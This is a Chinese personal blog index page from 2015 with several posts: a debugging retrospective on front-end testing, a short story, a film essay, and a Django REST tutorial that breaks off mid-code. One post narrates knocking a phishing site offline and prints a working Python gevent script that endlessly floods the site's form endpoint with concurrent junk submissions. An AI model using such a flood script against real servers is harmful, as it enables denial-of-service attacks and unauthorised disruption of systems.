
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">

    <title>主页</title>
    
    <script src="/assets/themes/bootstrap-3/bootstrap/js/jquery.min.js"></script>
    <meta name="author" content="Jinyi Xie">

    <!-- Enable responsive viewport -->
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">

    <!-- Bootstrap styles -->
    <link href="/assets/themes/bootstrap-3/bootstrap/css/bootstrap.min.css" rel="stylesheet">
    <!-- Optional theme -->
    <link href="/assets/themes/bootstrap-3/bootstrap/css/bootstrap-theme.min.css" rel="stylesheet">
    <link rel="stylesheet" type="text/css" href="/assets/themes/bootstrap-3/pygments.css">
    
    <!-- Custom styles -->
    <link href="/assets/themes/bootstrap-3/css/style.css?body=1" rel="stylesheet" type="text/css" media="all">

    <!--[if lt IE 9]>
      <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
      <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
    <![endif]-->

    <!-- Update these with your own images
      <link rel="shortcut icon" href="images/favicon.ico">
      <link rel="apple-touch-icon" href="images/apple-touch-icon.png">
      <link rel="apple-touch-icon" sizes="72x72" href="images/apple-touch-icon-72x72.png">
      <link rel="apple-touch-icon" sizes="114x114" href="images/apple-touch-icon-114x114.png">
    -->

    <!-- atom & rss feed -->
    <link href="/atom.xml" type="application/atom+xml" rel="alternate" title="Sitewide ATOM Feed">
    <link href="/rss.xml" type="application/rss+xml" rel="alternate" title="Sitewide RSS Feed">

  </head>

  <body>
    <div id="wrap">
      <nav class="navbar navbar-default navbar-inverse" role="navigation">
        <!-- Brand and toggle get grouped for better mobile display -->
        <div class="navbar-header">
          <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#jb-navbar-collapse">
            <span class="sr-only">Toggle navigation</span>
            <span class="icon-bar"></span>
            <span class="icon-bar"></span>
            <span class="icon-bar"></span>
          </button>
          <a class="navbar-brand" href="/">hsfzxjy</a>
        </div>

        <!-- Collect the nav links, forms, and other content for toggling -->
        <div class="collapse navbar-collapse" id="jb-navbar-collapse">
          <ul class="nav navbar-nav">
            
            
            


  
    
      
      	
      	<li><a href="/archieve.html">归档</a></li>
      	
      
    
  
    
      
    
  
    
      
      	
      	<li><a href="/categories.html">分类</a></li>
      	
      
    
  
    
  
    
      
      	
      	<li><a href="/pages.html">页面</a></li>
      	
      
    
  
    
      
    
  
    
      
    
  
    
      
      	
      	<li><a href="/tags.html">标签</a></li>
      	
      
    
  
    
      
      	
      	<li><a href="/about/">联系我</a></li>
      	
      
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  



          </ul>
        </div><!-- /.navbar-collapse -->
      </nav>

      <div class="container" id="main-container">
        
<div class="page-header">
  <h1 class="post-title">
         
         <small class="tagline">不忌讳空山无人，不害怕遥望星辰</small>
  </h1>
</div>

<div class="row">
  <div class="col-xs-12 post-content">
    
<link rel="stylesheet" type="text/css" href="/assets/themes//bootstrap-3/css/index.css?body=1">
<div class="posts">
  
    <article class="post-content">
        <header class="text-center">
            <h1 class="post-title">
                <a href="/wisecity-conclusion/">Wisecity 商赛总结——也谈前端自动化测试</a>
            </h1>
            <p class="time">24 Jul 2015</p>
        </header>
        <section class="content">
            <p>真没想到，高伯还是给了我两百块报酬（土豪就是土豪）——我还担心他连运营成本都不肯给呢，毕竟网站做得并不是令人太满意。为社团做了两年的网站，这是第一次收到报酬，也算是自己赚的第一桶金吧。</p>

<p>事实证明，临去北京前我给 cc 开放了管理者权限是一个非常正确的选择。尽管 wisecity 已经举办了两届，尽管在此之前我已做过 4 个网站，尽管这次的网站是在上一届的基础上进行改造的，我的心里仍有些忐忑不安，害怕它会出什么问题——抑或是大会的工作人员操作不当导致网站崩溃云云（这事真的发生了）。5 天的 wisecity 大会，我都身在北京，身边没有电脑，没有解决问题的条件，因此需要一个有基本的编程能力的人协助我。5 天下来，问题还不少，调试的过程可谓是十分原始：接到问题后，囿于有限的条件，我只能通过翻看手机上的代码，在脑海中模拟并觉出问题所在，找到最小代价的改动方案，再将改动之处通过短信通知 cc——当然，很多时候并不那么顺利，我还需要跟多的信息帮助判断，比如错误日志，又比如进行特定操作时的表现（这个最坑爹，可遇而不可求）。我尽一切努力在脑海中想象着程序的流程，很累，但也很有挑战性。</p>

<p>第一天就遇到了一个棘手的问题：高伯在删除测试数据时不小心把管理员账号（admin）一起删掉了。这个消息从扬声器传出后，我足足沉默了一分钟，
心里像是有千万头草泥马奔过：</p>

<blockquote>
<p>怎么这么毛手毛脚？这下可好了，麻烦大了——虽然这个设计是有些不合理，但这不能怪我，django 已经封装好了（姜戈：怪我咯？）。快想办法快想办法……直接去后台加一个？不行不行，密码这块很难弄，MD5 + SHA1 + Salt，根本不是人能算的——只能让 django 自己产生一个用户了。嗯，我需要一个 MySQL，一个完整的 Python 开发环境，各种包……不知 cc 能不能应付过来。真是的一大早!@#$%^……
<img src="http://i6.hexunimg.cn/2012-05-09/141219425.jpg" alt=""> </p>
</blockquote>

<p>挂断电话，抄起手机噼里啪啦给 cc 发了一条短信，手把手教配置 MySQL，django，导出 SQL，上传数据库……吧啦吧啦洋洋洒洒几百字。发送时一直祈祷：但愿 cc 悟性高一些，不然真的完了——还好，半个小时后，前线传来了好消息：一切顺利。</p>

<p>总算是松了一口气，才发现，背已汗湿。</p>

<p>然而，事情还没有结束。</p>

<p>第二天一早，我又被告知：上传的文件下载不了（纳尼？走之前不是才作过测试吗）。点开文件看网址，发现原来是七牛的域名后面少了一个<code>/</code>，很快便处理好了。本以为可以好好玩一天了（那天出去玩），逛了大半个北京，夕阳西下时，却又接到一个 bug：选手列表只显示了 10 个用户，但应该有 40+ 个。</p>

<p>这个 bug，前后调了 2 个小时。从奥林匹克公园，到中关村——因为，我并不知道问题出在哪，一点也不知道。打 <code>console.log</code>，翻看网络记录（没错！在短信这种高时滞的通讯条件下！），最终发现，原来是 REST 返回的用户列表顺序反了，加载了最后 10 个，但由于用户没有明显的顺序标志，所以调试时没有察觉。改正之后，终于可以安心吃完饭——</p>

<p>谁知，两分钟后，短信又开始轰炸了：加载的用户列表有重复项！很多的重复项！！没有规律的重复项！！！</p>

<p>这个 bug，前后又调了 2 个小时。从中关村，再到人大附中，直到繁星爬满了苍穹。第一个反应是自制的瀑布流控件滚动事件并发处理没有做好。翻看源代码，似乎找到一处疑似有问题的地方，尝试让 cc 改了一下——半个小时后，传回了一个令人泄气的消息（中间配置<code>grunt</code>又耗费了好些功夫）。冥想了一个小时，前后端的代码都看遍了，就是没有发现问题，最终只得放弃，告诉高伯用一些奇技*巧避开重复项。直至回来后，静下心分析代码，才发现在一个不起眼的地方有一处笔误，这是重构 HFMUN 的瀑布流控件时产生的。</p>

<p>之后的几天，又有几个大大小小的 bug，抑或是需求改动，处理得还算顺利。可怕的是最后一天，KVDB 直接宕掉了——我整个缓存都是挂在 KVDB 上的，也怪当时没有作容灾处理，这个事件直接导致全站报 500 错误。急急忙忙关掉了缓存（还好做缓存时解了耦，只需改动两处即可），然后再质问 SAE，这些都是后话了。</p>

<p>然而，这里有个值得反思的问题：既然我已经作过 4 个网站，为何还是会有 bug 出现？从 HFMUN 1.0，到 wisecity 1.0，到 HFMUN 2.0，随着我技术的逐渐成熟，bug 出现的频率也在不断下降——但是 bug 仍在，就像“杀不死的小强”一样。</p>

<p>测试，关键还是在测试。</p>

<p>人的主观意识，受制于时空、环境等诸多因素，任何一个参数的改变都有可能影响主观能动性的发挥。因此，不能保证在任何时候人的意识都能正确地、高效地发挥作用。软件工程，作为人类纯意识的产物，其正确性并不能百分百地保证。或是精神不振引起的一处笔误，或是重构迁移时没有同步更改的一处配置，抑或是一处自己在开发过程中完全没有意识到的错误——设计归设计，程序是否能运行，还是电脑说了算。许多的 bug 就是这样产生的。</p>

<p>这个时候，单元测试（Unit Test）就显得非常重要了。通过分析需求而设计的测试样例，可以保证功能的相对正确性，即在能够考虑到的所有情况下，程序都能狗正常运行。这是重构（Refactory）过程中十分重要的一个环节，因为外部不变性是重构必须遵守的一个准则。</p>

<p>在软件工程的上古时代，测试常常是由人工来完成的。团队中，总有几名成员每天都在做着重复、机械的工作，即对新增的功能或是修改过的功能进行测试。这种测试机制费时费力，同时也不是非常有效——上面已经说过了，没有人能保证主观意识的正确性。后来，出现了基于脚本的批量测试，测试人员可以编写一小段代码对特定的功能进行校验，很大程度地提高了效率；再到今天的分布式测试，成熟的测试系统可以模拟多种不同的生产环境，检测到代码库的变化后，便会自动进行单元测试。这是单元测试的自动化进程。</p>

<p>今天的自动化测试固然很成熟，基本可以检测到各种逻辑错误。但在测试领域，却仍有一处令其束手无策的“禁地”——这便是 GUI 测试。综合分析 wisecity2.0 的 bugs，其中大部分都是前端出了问题。GUI 测试的麻烦在于：</p>

<ul>
<li>GUI 是一个输入与输出交替进行的系统，并且输入具有无限的可能，无法用有限的测试样例对输入进行覆盖。比如第二天发生的那个 bug 需要在“文件上传成功后，跳转到首页，点击下载链接”、“用户数量超过 10 个，在列表页面快速滚动鼠标滚轮”才能被触发。许多的 bug 只有在真实生产环境中被用户捕捉到。</li>
<li>GUI 的正确性没有一个绝对的判定标准。元素错位、颜色不正确，这些事件都不报错，但它们也是 bug，通常也只有人类认为它们是 bug。但它们的发生并不影响功能，只是用户体验（User Experience）不好——用户体验是一个纯主观的概念，至少在当下，计算机是不能理解的。</li>
</ul>

<p>目前，GUI 测试主要还是依赖人工。Facebook 就有一个庞大的测试人员系统，以模拟尽可能多的用户操作样例。诚然，业界已经开始出现一些 前端自动化测试框架，有如 selenium、phantomjs 等通过 mock 事件模拟用户操作，更有甚者如 PhantomCSS 可以对特定操作的结果进行像素比对，可软件的主观部分还是需要人脑来判断。</p>

<p>这是一个好时代，周围的一切都在飞快地变化着。希望在不久的将来，当人工智能出现时，这个问题能够有效地解决。</p>

        </section>
        
          <ul class="tag_box inline">
            <li><i class="glyphicon glyphicon-open"></i></li>
            
            


  
     
    	<li><a href="/categories.html#编程-ref">
    		编程 <span>34</span>
    	</a></li>
     
    	<li><a href="/categories.html#总结-ref">
    		总结 <span>1</span>
    	</a></li>
     
    	<li><a href="/categories.html#前端-ref">
    		前端 <span>1</span>
    	</a></li>
     
    	<li><a href="/categories.html#单元测试-ref">
    		单元测试 <span>1</span>
    	</a></li>
    
  


          </ul>
          

        
          <ul class="tag_box inline">
            <li><i class="glyphicon glyphicon-tags"></i></li>
            
            


  
     
    	<li><a href="/tags.html#wisecity-ref">wisecity <span>1</span></a></li>
     
    	<li><a href="/tags.html#前端自动化测试-ref">前端自动化测试 <span>1</span></a></li>
    
  



          </ul>
         
    </article>
  
    <article class="post-content">
        <header class="text-center">
            <h1 class="post-title">
                <a href="/how-to-fuck-a-bilk-site/">记一次 DoS 诈骗网站的经历</a>
            </h1>
            <p class="time">24 Jul 2015</p>
        </header>
        <section class="content">
            <p>题海中激战，正当不亦乐乎时，手机响了。低头一看，是 95599 的短信：</p>

<blockquote>
<p>尊敬的农行用户，您的账户积分累计现可兑换价值 1024 元现金大礼包！请手机登陆 <a href="http://wap.abchyd.com">wap.abchyd.com</a> 进行领取！【农业银行】</p>
</blockquote>

<p>1024 元？哼！这个数还挺整，但一看就是诈骗短信：哪有银行的域名长得和天书一样？更何况，我又没有农行的账户。</p>

<p>正待删除时，一个念头划过脑海，指尖悬停在屏幕上方。</p>

<p>突然想起昨天在 Freebuf 上看到的一篇文章，说是一个黑帽把臭名昭著的“10086 诈骗”给调戏了一番，在其数据库里填满了垃圾。Freebuf 上许多黑技术我从来都是可望而不可即，唯独这个比较简单——不就是写个脚本嘛，几分钟的事。既然他骗人骗到我这里来了，何不好好调戏一下呢？</p>

<p>果断打开电脑，打开 Chrome，输入网址，映入眼帘的是一个表单（网站已被黑掉因此就没有图了，好吧我错了），要求用户填写 银行卡、密码、手机号还有一个逼格很高的验证码。</p>

<p>F12 分析，发现对各个字段的校验仅仅局限于长度的检查，连格式检查都没有。至于验证码，随便填写四个数字就可以通过了（真是弱爆了，好吗！）。表单提交后跳转到一个有菊花加载圈的页面——说是“稍等，切勿关闭页面”，但其实这个页面并不会跳转，也不会有其他的操作，只有那个菊花一直在转。扫一眼地址栏，发现是<code>asp</code>结尾——这又给了我不小的鼓励（这里并没有黑微软的意思， ASP 是十年前的产物，放在现在可以说是弱的不行了）。</p>

<p>该怎么调戏呢？一个想法飞快地在脑海中产生——对了，就用高并发的垃圾数据拖爆它的数据库吧。这类钓鱼网站通常都是 IIS 6.0 + ASP + SQL SERVER，并且还是单机服务器，并发度一高机器很容易就垮了。</p>

<p>简单地谢了一个脚本：</p>
<div class="highlight"><pre><code class="language-python" data-lang="python"><span class="c">#! /usr/bin/python</span>

<span class="kn">import</span> <span class="nn">gevent.monkey</span>
<span class="n">gevent</span><span class="o">.</span><span class="n">monkey</span><span class="o">.</span><span class="n">patch_all</span><span class="p">()</span>
<span class="kn">import</span> <span class="nn">gevent</span>
<span class="kn">import</span> <span class="nn">urllib2</span><span class="o">,</span> <span class="nn">urllib</span>
<span class="kn">from</span> <span class="nn">uuid</span> <span class="kn">import</span> <span class="n">uuid1</span>

<span class="k">def</span> <span class="nf">fuck</span><span class="p">():</span>
    <span class="nb">id</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">uuid1</span><span class="p">())[:</span><span class="mi">16</span><span class="p">]</span>
    <span class="k">print</span> <span class="s">&#39;fucking&#39;</span><span class="p">,</span> <span class="nb">id</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="n">urllib2</span><span class="o">.</span><span class="n">urlopen</span><span class="p">(</span><span class="s">&#39;http://www.abchyd.com/add_1.asp&#39;</span><span class="p">,</span> <span class="n">urllib</span><span class="o">.</span><span class="n">urlencode</span><span class="p">({</span>
            <span class="s">&#39;logonCardNum&#39;</span><span class="p">:</span> <span class="nb">id</span><span class="p">,</span>
            <span class="s">&#39;netType&#39;</span><span class="p">:</span> <span class="s">&#39;111111&#39;</span><span class="p">,</span>
            <span class="s">&#39;tel&#39;</span><span class="p">:</span> <span class="s">&#39;12345678900&#39;</span><span class="p">,</span>
            <span class="s">&#39;randomId&#39;</span><span class="p">:</span> <span class="s">&#39;1234&#39;</span>
        <span class="p">}))</span>
    <span class="k">except</span><span class="p">:</span>
        <span class="k">pass</span>

    <span class="k">print</span> <span class="s">&#39;fucking&#39;</span><span class="p">,</span> <span class="nb">id</span><span class="p">,</span> <span class="s">&#39;ok&#39;</span>

<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
    <span class="n">gevent</span><span class="o">.</span><span class="n">joinall</span><span class="p">([</span><span class="n">gevent</span><span class="o">.</span><span class="n">spawn</span><span class="p">(</span><span class="n">fuck</span><span class="p">)</span> <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">100</span><span class="p">)])</span>
</code></pre></div>
<p>这里用 <code>gevent</code> 将 Socket 由阻塞型改装为协程型，以提高请求的并发度。</p>

<p>接着，关掉所有的图形界面，只开一个终端（为了节省内存），运行 <code>./fuckit.py</code>。哈哈哈，受死吧！</p>

<p>用平板再次打开该网址（电脑已经跑不起浏览器了），可以发现网站已经明显慢了下来，时不时还会有 500 错误。</p>

<p>两个小时后。</p>

<p>当我再次访问网站时，它已经完全当机了。用<code>nmap</code>扫了一遍，也没有端口活着了。一台邪恶的服务器就这样被干掉了。</p>

<p>但我知道，这样的服务器，在世界上还存在着许多许多。曾经有段时间，不断遇到域名为 www.10086xxx.com 的诈骗网站。常常是一个域名被封了，另一个域名便冒出来，可见诈骗者拥有海量的资源。</p>

<p>这次的攻击只是一次游戏，一次尝试，得以成功只是因为对方太弱了。</p>

<p>真正的网络攻防战，远不止如此。</p>

        </section>
        
          <ul class="tag_box inline">
            <li><i class="glyphicon glyphicon-open"></i></li>
            
            


  
     
    	<li><a href="/categories.html#安全-ref">
    		安全 <span>1</span>
    	</a></li>
     
    	<li><a href="/categories.html#编程-ref">
    		编程 <span>34</span>
    	</a></li>
    
  


          </ul>
          

         
    </article>
  
    <article class="post-content">
        <header class="text-center">
            <h1 class="post-title">
                <a href="/secret/">不能说的秘密</a>
            </h1>
            <p class="time">12 Jun 2015</p>
        </header>
        <section class="content">
            <p>又遇到了一道难题。他轻轻放下笔，缓缓抬起了头。无意中，目光触及了她的背影。夕阳透过窗子，给那一隅洒下一片金黄，增添了几分童话般的意境。</p>

<p>他的心动了一下，但很快又抑制住了那种奇妙的感觉。随即，他笑了笑，便埋下头去，继续解决那道艰深的难题。</p>

<p>他知道，这一切，只是为了那个诺言。</p>

<p>他清楚地记得，在早些时候，他和她许下了一个诺言：这三年，我们就把对方当成空气吧，谁也不认识谁。</p>

<p>很奇怪的约定，不是吗？既然是同班同学，抬头不见低头见，又何出此言。</p>

<p>想到这，他竟有些羞愧起来。</p>

<p>而事实上，在更早些的时候，他们的关系并不是这样的——甚至，还是较要好的朋友。在那个遥远的年代，当女孩还未成为少女，他们还曾一起外出学习，一起嬉闹。他俩的相识源于各自父母的同学关系——他很高兴，她也很高兴，自己有这么一个朋友。</p>

<p>是的，只是朋友，不是别的什么——一个令人向往的时候。</p>

<p>上了初中，尽管进了不同的班级，他还是偶尔会去找她。一切依旧。</p>

<p>但不知为何，一些奇怪的话却在班上渐渐漫开，如同疯长的野草。每一次去找她，他都感觉背后有人在窃窃私语，甚至还有几双异样的目光。诚然，在这个情窦初开的年纪，这样的一种关系是很敏感的。</p>

<p>起初，他很反感这些言论。每一次，他都会极力辩解，甚至和对方吵得面红耳赤。可换来的，却是各种鬼脸，以及更加刻薄的话，就像火上浇油一般。</p>

<p>渐渐地，他学会了沉默。为了避开那些讨厌的话，也不再那么频繁地去找她了。</p>

<p>但，不知为什么，这之后每次想起她，心里却多了一些异样的感觉——这在以前是没有的，一种莫名的、不由自主的激动，一种朦胧的依恋——</p>

<p>就像那流言蜚语所说的，他喜欢上她了。</p>

<p>人，真是奇怪的动物。</p>

<p>他不再对那些传言感到愤怒，甚至，还附和起来，公开表露自己的心声——这时，他清楚：这已不再是传言，而是自己真实的想法。</p>

<p>然而，她却在悄悄地发生变化——不知为何，他每次去找她，她却借故不出来。在路上相遇，也不打招呼，没有微笑，宛如陌生人一般。</p>

<p>他很奇怪，却也没多想，大概是有了新朋友罢——人都会长大的。</p>

<p>直到，那个落雨的夏夜。</p>

<p>那天，正是中考放榜的日子，他得知她和自己考入了同一所重点高中，并进入了同一个重点班，很是兴奋。刚想通过QQ为她庆贺，不料却发觉：自己已被她拉黑了。</p>

<p>想起初中三年的种种变化，他再也忍不住了，立即发短信询问她。得到的，却是她冰冷的回复：</p>

<p>“之前我一直把你当朋友，可你却把我们想成某种关系，还到处宣扬。这让我很受伤。我想，我们还是不要做朋友了……”</p>

<p>“接下来的三年，我真的不知道该如何度过，和你同在一个班，我真的很痛苦。就把我当成空气吧，这样对你我都好……”</p>

<p>他沉默了，回想自己的种种，的确，有些太过分了。但他却不知，这些事，会如此伤她的心。</p>

<p>也好，就让我们彼此当陌生人吧。</p>

<p>夕阳转了个角度，那一片金黄在一点点扩大，但同时也变得更加温柔。</p>

<p>两年了，他们没有说过一句话。</p>

<p>尽管流言蜚语早已不在，他也不愿再与她接触——一切，都是因为那个诺言。</p>

<p>如果不能做朋友，那不伤害对方，也是一种善良。</p>

<p>“之前你们关系不是很好的吗？怎么现在像不认识了一样？”两年来，常有好奇的人问他。</p>

<p>每一次，他都会神秘地笑一笑：</p>

<p>“这是一个不能说的秘密。”</p>

<p>（致：那个被伤害过的她）</p>

        </section>
        
          <ul class="tag_box inline">
            <li><i class="glyphicon glyphicon-open"></i></li>
            
            


  
     
    	<li><a href="/categories.html#杂感-ref">
    		杂感 <span>8</span>
    	</a></li>
    
  


          </ul>
          

        
          <ul class="tag_box inline">
            <li><i class="glyphicon glyphicon-tags"></i></li>
            
            


  
     
    	<li><a href="/tags.html#不经意间的感动-ref">不经意间的感动 <span>5</span></a></li>
    
  



          </ul>
         
    </article>
  
    <article class="post-content">
        <header class="text-center">
            <h1 class="post-title">
                <a href="/that-starry-night/">那一年，我们望向星空</a>
            </h1>
            <p class="time">08 May 2015</p>
        </header>
        <section class="content">
            <blockquote>
<p>还记得吗     </p>

<p>那年夏天     </p>

<p>最灿烂、最寂寞的星空</p>
</blockquote>

<p>其实，比这部电影更出名的，是五月天的那首《星空》，一首我十分熟悉的歌。每当那旋律响起，我总有些淡淡的惆怅：夜空下，尽管繁星璀璨，却无法触及；生活中，尽管万分努力，无奈梦想却悄悄陨落——世上的一切，似乎总要与人作对。然而一曲过后，当那歇斯底里的旋律如晨雾渐渐散去，悔恨、无奈与痛苦，也随之沉淀下来，一切又恢复了平静——就像是伫立于人生的黄昏中，回忆着年少时那数不清的美梦。</p>

<p>而，直到最近我才得知：这只是一首片尾曲，原来还有一部与它同名的电影。</p>

<p>《星空》。</p>

<p>没有浮华的特效，没有肉麻的对白。那一年，一个少年，一位少女，一段耐人寻味的经历。</p>

<p>“我们一起去看星空吧。”</p>

<p>那一晚，在城市的光与影中，在混凝土森林间，小美轻轻地问小杰，没有过多的犹豫。</p>

<p>也许，小美的遭遇是值得同情的：尽管家境殷实，父母却常常争吵不休。每每置身于这偌大的房子里，却都如同处在异域时空，唯有那陈旧的回忆才能给她些许慰藉。相似的经历，让少女认识了小杰——那个在圣诞夜吹笛子的男孩，那个和她一起做教室布置的男孩。</p>

<p>腾空而起的火车，云雾缭绕的阿里山，雨夜的旧教堂，爷爷的小木屋……一场梦幻般的冒险正在进行着。当然，还有那一夜的星空，灿烂得令人终生难忘。</p>

<p>可惜，小美却病倒了，旅途也不得不要结束了。</p>

<p>但生活还得继续。从山里回来，小杰便匆匆地走了，甚至，还没来得及说再见；小美的父母还是离婚了，尽管，小美并不希望。曾经的美好，如松动的拼图般叮当散落下来，露出背后灰色的现实——就像那梦中的场景，残酷，毫不留情。</p>

<p>只是，那片星空，给了她些许慰藉。</p>

<p>随着时光流逝，曾经的不解与难舍，终究还是要散去——而留下的，仅有回忆。这，也是歌曲《星空》所要表达的。</p>

<p>曾几何时，我们每个人心中，都有一片属于自己的星空——在年少时，在我们的上古时代，当我们依旧单纯。</p>

<p>总有一段幻想，让我们流连忘返，就像驰骋于梵高画卷中的铁皮列车；总有一段冒险，让我们刻骨铭心，正如山林间那次凶险的跋涉；而总有一个人，值得我们用一生去回忆。</p>

<p>当残酷的现实还未闯入梦境，当尘世的烦扰还没纠缠于心，那时，那个无法无天的自己，才是真正快乐的。</p>

<p>人，是脆弱的。也许，生活的磨难能使我们变得懦弱，岁月的流逝会让我们失去梦想，世间的一切都和自己过不去。</p>

<p>但，人也可以很坚强。需要的并不多，只是那一片铭记在心的星空。</p>

        </section>
        
          <ul class="tag_box inline">
            <li><i class="glyphicon glyphicon-open"></i></li>
            
            


  
     
    	<li><a href="/categories.html#杂感-ref">
    		杂感 <span>8</span>
    	</a></li>
    
  


          </ul>
          

        
          <ul class="tag_box inline">
            <li><i class="glyphicon glyphicon-tags"></i></li>
            
            


  
     
    	<li><a href="/tags.html#不经意间的感动-ref">不经意间的感动 <span>5</span></a></li>
    
  



          </ul>
         
    </article>
  
    <article class="post-content">
        <header class="text-center">
            <h1 class="post-title">
                <a href="/hfmun-reconstruction-4/">【HFMUN重构系列】4. Restful API 框架</a>
            </h1>
            <p class="time">23 Apr 2015</p>
        </header>
        <section class="content">
            <h2><strong>0x01 什么是REST</strong></h2>

<p>“REST”这个词，也许会在许多场合上出现，但并不是每个人都理解它的意思。在维基百科中，它被定义为：</p>

<blockquote>
<p><strong>Representational State Transfer (REST)</strong> is a software architecture style consisting of guidelines and best practices for creating scalable web services. REST is a coordinated set of constraints applied to the design of components in a distributed hypermedia system that can lead to a more performant and maintainable architecture.    —— From <a href="http://en.wikipedia.org/wiki/Representational_state_transfer">Wikipedia</a></p>
</blockquote>

<p>也就是说：<strong>REST，它不是一种技术，也不是一种标准，而是一种网络资源访问模式，一种编程哲学</strong>。狭义上来说，REST指的是这样的设计思想：</p>

<ol>
<li>每一个 URI 代表一种资源</li>
<li>客户端和服务器之间，传递这种资源的某种表现层</li>
<li>客户端通过五个 HTTP 动词（GET，POST，PUT，PATCH，DELETE），对服务器端资源进行操作，实现&quot;表现层状态转化&quot;（State Transfer）</li>
</ol>

<p>狭义的 REST 范式是基于 B/S 架构，并使用 HTTP 协议进行数据交互。比起古老而笨重的 SOAP 等架构，这种模式更加轻便、直观，使网络资源的访问变得简洁、优雅，也更加符合当今 Web 开发的需求。</p>

<h2><strong>0x02 如何正确使用 REST</strong></h2>

<p>正如上面所说，REST 是基于 HTTP 协议的。它用 URI 来定义资源，并用 HTTP 请求来操作资源。然而，并不是说使用了 HTTP 协议即可称之为 REST——真正意义上的 REST，有自己的一套准则。也正是这套准则，才使得 REST 简洁、优雅。</p>

<h3>REST 是语义的</h3>

<p>语义的（Semantic）是指：<strong>资源的 URI 或是资源的访问必须是有意义的，符合或尽量符合自然语言的规范</strong>。</p>

<p>举个例子：如果我要访问订单的列表，那么一个良好的 URI 定义应该是这样的：</p>
<div class="highlight"><pre><code class="language-http" data-lang="http"><span class="nf">GET</span> <span class="nn">/orders/</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
</code></pre></div>
<p>资源的 URI 通常由名词组成，这也正符合自然语言的规范——表达一个物体，人们使用名词。</p>

<p>如果要精确定位某一个资源，通常需要进一步限制资源：</p>
<div class="highlight"><pre><code class="language-http" data-lang="http"><span class="nf">GET</span> <span class="nn">/orders/1/</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
</code></pre></div>
<p>或是：</p>
<div class="highlight"><pre><code class="language-http" data-lang="http"><span class="nf">GET</span> <span class="nn">/orders/current/</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
</code></pre></div>
<p>甚至，可以表示资源的从属关系：</p>
<div class="highlight"><pre><code class="language-http" data-lang="http"><span class="nf">GET</span> <span class="nn">/users/current/orders/1/</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
</code></pre></div>
<p>这就像在和服务器对话一样：<strong>“请给我当前用户的第一份订单”</strong>。</p>

<p>而一些与资源本身无关的信息，比如列表的最大数目，可以放到 URI Params 中：</p>
<div class="highlight"><pre><code class="language-HTTP" data-lang="HTTP"><span class="nf">GET</span> <span class="nn">/orders/?limit=20</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
</code></pre></div>
<p>HTTP协议中的动词（Verbs），通常用来描述对资源的操作。每一种动词都有它自己的意义：</p>

<ul>
<li><strong>GET</strong>——获取资源</li>
<li><strong>POST</strong>——建立一个新的资源</li>
<li><strong>PUT</strong>——修改一个资源，必须提交该资源的所有内容</li>
<li><strong>PATCH</strong>——修改一个资源，可以只提交该资源的一部分内容</li>
<li><strong>DELETE</strong>——删除一个资源</li>
</ul>

<h3>REST 是多样的</h3>

<p>至于返回的数据，服务器端可以提供多种格式供客户端选择，如 JSON、XML、YAML等等，通常用格式的缩写作为尾缀：</p>
<div class="highlight"><pre><code class="language-http" data-lang="http"><span class="nf">GET</span> <span class="nn">/orders.json/</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
</code></pre></div>
<h3>REST 是健壮的</h3>

<p>倘若用户请求的资源不存在或是提交的数据不合规范，服务器必须以<strong>HTTP状态码</strong>的方式通知客户端。常用的状态码有：</p>

<ul>
<li><strong>400</strong> 请求参数有误</li>
<li><strong>401</strong> 用户未登录</li>
<li><strong>403</strong> 没有权限</li>
<li><strong>404</strong> 资源找不到</li>
</ul>

<h2><strong>0x03 django 中的 REST</strong></h2>

<p>像 REST 这么高大上的东西，早就有人对它进行了实现，这便是：<a href="http://www.django-rest-framework.org/">Django Rest Framework</a>。基本的用法可以参见官网。</p>

<p>成熟的框架并不是最好的，只有适合自己的才是。在使用过程中我遇到了一系列的问题，并以自己的方式解决了他们。</p>

<h3>ViewSet 的路由不够 D.R.Y.</h3>

<p><code>ViewSet</code> 是 <code>rest_framework</code>中一个十分有创意的地方。它将 CRUD 操作集中到了一个类中，提高了代码的复用性。然而，每一个 <code>ViewSet</code> 都需要 定义一个 <code>Router</code> 进行 URL 路由，这很麻烦。于是乎我便想：</p>

<blockquote>
<p>要是能让它自动感知<code>ViewSet</code>的存在并自动为其定义路由，就像<code>django</code>中的<code>Models</code>一样，那该多好啊</p>
</blockquote>

<p>于是，我仿照<code>django.apps.registry</code>，写了一个能在启东时探知一个 app 中固定内容的 <code>app_cache</code> 模块：</p>
<div class="highlight"><pre><code class="language-python" data-lang="python"><span class="c"># app_cache/core.py</span>

<span class="kn">from</span> <span class="nn">django.utils.importlib</span> <span class="kn">import</span> <span class="n">import_module</span>
<span class="kn">from</span> <span class="nn">django.utils.module_loading</span> <span class="kn">import</span> <span class="n">module_has_submodule</span>
<span class="kn">from</span> <span class="nn">django.apps</span> <span class="kn">import</span> <span class="n">apps</span>

<span class="k">class</span> <span class="nc">AppCache</span><span class="p">(</span><span class="nb">object</span><span class="p">):</span>
    <span class="sd">&#39;&#39;&#39;</span>
<span class="sd">    Inherit this class and override the fields below, then import and instantiate</span>
<span class="sd">    the subclass at AppConfig.ready method.</span>
<span class="sd">    &#39;&#39;&#39;</span>

    <span class="n">module_name</span> <span class="o">=</span> <span class="s">&#39;&#39;</span>
    <span class="n">object_name</span> <span class="o">=</span> <span class="s">&#39;&#39;</span>
    <span class="n">default_object</span> <span class="o">=</span> <span class="s">&#39;&#39;</span>

